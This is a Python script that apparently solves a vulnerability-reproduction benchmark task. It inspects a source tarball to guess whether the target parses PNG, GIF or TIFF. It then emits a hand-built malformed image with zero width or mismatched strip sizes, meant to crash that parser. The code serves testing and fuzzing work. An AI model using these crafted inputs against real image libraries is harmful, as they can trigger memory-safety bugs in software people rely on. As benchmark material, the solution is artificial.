import io
import os
import re
import struct
import tarfile
import zlib
from collections import defaultdict
from typing import Dict, Iterable, List, Optional, Tuple


def _png_chunk(ctype: bytes, data: bytes) -> bytes:
    ln = struct.pack(">I", len(data))
    crc = zlib.crc32(ctype)
    crc = zlib.crc32(data, crc) & 0xFFFFFFFF
    return ln + ctype + data + struct.pack(">I", crc)


def _zlib_stored(data: bytes) -> bytes:
    # ZLIB header: CMF/FLG (0x78 0x01) for no compression/fastest
    out = bytearray(b"\x78\x01")
    i = 0
    n = len(data)
    while i < n:
        chunk = data[i:i + 65535]
        i += len(chunk)
        final = 1 if i >= n else 0
        out.append(final)  # BFINAL + BTYPE=00 => 0x01 for final, else 0x00
        out.extend(struct.pack("<H", len(chunk)))
        out.extend(struct.pack("<H", 0xFFFF ^ len(chunk)))
        out.extend(chunk)
    ad = zlib.adler32(data) & 0xFFFFFFFF
    out.extend(struct.pack(">I", ad))
    return bytes(out)


def _gen_png_zero_width(height: int = 1) -> bytes:
    if height < 1:
        height = 1
    sig = b"\x89PNG\r\n\x1a\n"
    ihdr = struct.pack(">IIBBBBB", 0, height, 8, 0, 0, 0, 0)  # w=0, grayscale 8-bit
    raw = b"\x00" * height  # filter byte per scanline (no pixel bytes because width=0)
    idat = _zlib_stored(raw)
    return sig + _png_chunk(b"IHDR", ihdr) + _png_chunk(b"IDAT", idat) + _png_chunk(b"IEND", b"")


def _gen_gif_zero_screen() -> bytes:
    # Logical screen: width=0, height=1; Image descriptor: width=1, height=1
    header = b"GIF89a"
    lsd = struct.pack("<HHBBB", 0, 1, 0x80, 0, 0)  # GCT flag=1, size=2 entries
    gct = b"\x00\x00\x00" + b"\xff\xff\xff"  # black, white
    img_desc = b"\x2C" + struct.pack("<HHHHB", 0, 0, 1, 1, 0x00)
    lzw_min = b"\x02"
    # LZW data for single pixel: clear(4), index(0), end(5) with code size 3 bits -> bytes 0x44 0x01
    img_data = b"\x02\x44\x01\x00"
    trailer = b"\x3B"
    return header + lsd + gct + img_desc + lzw_min + img_data + trailer


def _tiff_ifd_entry(tag: int, typ: int, count: int, value: int) -> bytes:
    return struct.pack("<HHII", tag, typ, count, value)


def _gen_tiff_zero_width() -> bytes:
    # Little-endian TIFF with StripByteCounts=1 but ImageWidth=0
    # Header: II 42 offset=8
    header = b"II" + struct.pack("<H", 42) + struct.pack("<I", 8)

    entries: List[bytes] = []
    # Tags (sorted)
    # 256 ImageWidth (LONG) = 0
    entries.append(_tiff_ifd_entry(256, 4, 1, 0))
    # 257 ImageLength (LONG) = 1
    entries.append(_tiff_ifd_entry(257, 4, 1, 1))
    # 258 BitsPerSample (SHORT) = 8 (stored in value field)
    entries.append(_tiff_ifd_entry(258, 3, 1, 8))
    # 259 Compression (SHORT) = 1
    entries.append(_tiff_ifd_entry(259, 3, 1, 1))
    # 262 PhotometricInterpretation (SHORT) = 1 (BlackIsZero)
    entries.append(_tiff_ifd_entry(262, 3, 1, 1))
    # 273 StripOffsets (LONG) = data_offset (filled later)
    # 277 SamplesPerPixel (SHORT) = 1
    entries.append(_tiff_ifd_entry(277, 3, 1, 1))
    # 278 RowsPerStrip (LONG) = 1
    entries.append(_tiff_ifd_entry(278, 4, 1, 1))
    # 279 StripByteCounts (LONG) = 1
    entries.append(_tiff_ifd_entry(279, 4, 1, 1))
    # 284 PlanarConfiguration (SHORT) = 1
    entries.append(_tiff_ifd_entry(284, 3, 1, 1))

    # We'll insert StripOffsets entry in correct sorted position (tag 273)
    # Compute IFD size with one extra entry for 273
    n = len(entries) + 1
    ifd_size = 2 + n * 12 + 4
    data_offset = 8 + ifd_size

    # Build IFD entries sorted
    all_entries: List[Tuple[int, bytes]] = []
    for e in entries:
        tag = struct.unpack_from("<H", e, 0)[0]
        all_entries.append((tag, e))
    all_entries.append((273, _tiff_ifd_entry(273, 4, 1, data_offset)))
    all_entries.sort(key=lambda x: x[0])

    ifd = bytearray()
    ifd.extend(struct.pack("<H", n))
    for _, e in all_entries:
        ifd.extend(e)
    ifd.extend(struct.pack("<I", 0))  # next IFD offset

    data = b"\x00"  # one byte of strip data
    return header + bytes(ifd) + data


def _infer_format_from_tar(src_path: str) -> str:
    # Returns: 'png', 'gif', 'tiff', fallback 'png'
    try:
        tf = tarfile.open(src_path, "r:*")
    except Exception:
        return "png"

    with tf:
        members = [m for m in tf.getmembers() if m.isfile()]
        name_scores: Dict[str, int] = defaultdict(int)

        def bump(fmt: str, pts: int) -> None:
            name_scores[fmt] += pts

        # Filename-based hints (fast, no reads)
        for m in members:
            n = m.name.lower()
            if "png" in n:
                bump("png", 2)
            if "gif" in n:
                bump("gif", 2)
            if "tif" in n or "tiff" in n:
                bump("tiff", 2)
            if "jpeg" in n or "jpg" in n:
                bump("jpeg", 1)
            if "webp" in n:
                bump("webp", 1)
            if "bmp" in n:
                bump("bmp", 1)
            if "fuzz" in n or "fuzzer" in n:
                bump("fuzz", 1)

        # Choose small, likely-relevant text files to read
        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".py", ".cmake", ".txt", ".md", ".rs", ".go", ".java")
        read_candidates: List[tarfile.TarInfo] = []
        for m in members:
            n = m.name.lower()
            if m.size > 1024 * 1024:
                continue
            if not n.endswith(exts):
                continue
            if ("fuzz" in n) or ("oss-fuzz" in n) or ("fuzzer" in n) or n.endswith(("cmakelists.txt", "configure.ac", "meson.build", "cargo.toml")):
                read_candidates.append(m)

        # If no obvious candidates, sample a few build files
        if not read_candidates:
            for m in members:
                n = os.path.basename(m.name).lower()
                if m.size > 512 * 1024:
                    continue
                if n in ("cmakelists.txt", "configure.ac", "meson.build", "makefile", "cargo.toml", "setup.py"):
                    read_candidates.append(m)

        def scan_text(text: str, weight: int) -> None:
            s = text.lower()
            if "llvmfuzzertestoneinput" in s or "fuzzertestoneinput" in s:
                bump("fuzz", 10 * weight)
            # PNG
            if "#include <png.h>" in s or "png_read_info" in s or "ihdr" in s or "idat" in s:
                bump("png", 8 * weight)
            if "spng" in s or "lodepng" in s:
                bump("png", 6 * weight)
            # GIF
            if "gif89a" in s or "gif87a" in s or "gif_lib.h" in s or "dgifopen" in s or "egifopen" in s:
                bump("gif", 8 * weight)
            # TIFF
            if "tiffio.h" in s or "tiffopen" in s or "libtiff" in s:
                bump("tiff", 8 * weight)
            # JPEG
            if "jpeglib.h" in s or "jpeg_" in s:
                bump("jpeg", 6 * weight)
            # General image loaders
            if "stb_image" in s or "stbi_load" in s:
                bump("png", 2 * weight)
                bump("gif", 2 * weight)
                bump("jpeg", 2 * weight)
                bump("bmp", 2 * weight)

        # Read and scan a limited number of candidates
        # Keep it quick: cap total bytes read.
        total_read = 0
        cap = 3 * 1024 * 1024
        for m in read_candidates[:200]:
            if total_read >= cap:
                break
            try:
                f = tf.extractfile(m)
                if not f:
                    continue
                data = f.read(min(m.size, 512 * 1024))
            except Exception:
                continue
            total_read += len(data)
            try:
                txt = data.decode("utf-8", "ignore")
            except Exception:
                continue
            w = 3 if ("fuzz" in m.name.lower() or "fuzzer" in m.name.lower()) else 1
            scan_text(txt, w)

        # Decide
        # Prefer formats we can generate and that have non-trivial evidence.
        candidates = [("png", name_scores.get("png", 0)),
                      ("gif", name_scores.get("gif", 0)),
                      ("tiff", name_scores.get("tiff", 0))]
        candidates.sort(key=lambda x: (x[1], 1 if x[0] == "png" else 0), reverse=True)
        best_fmt, best_score = candidates[0]
        if best_score <= 0:
            return "png"
        return best_fmt


class Solution:
    def solve(self, src_path: str) -> bytes:
        fmt = _infer_format_from_tar(src_path)
        if fmt == "gif":
            return _gen_gif_zero_screen()
        if fmt == "tiff":
            return _gen_tiff_zero_width()
        return _gen_png_zero_width(height=1)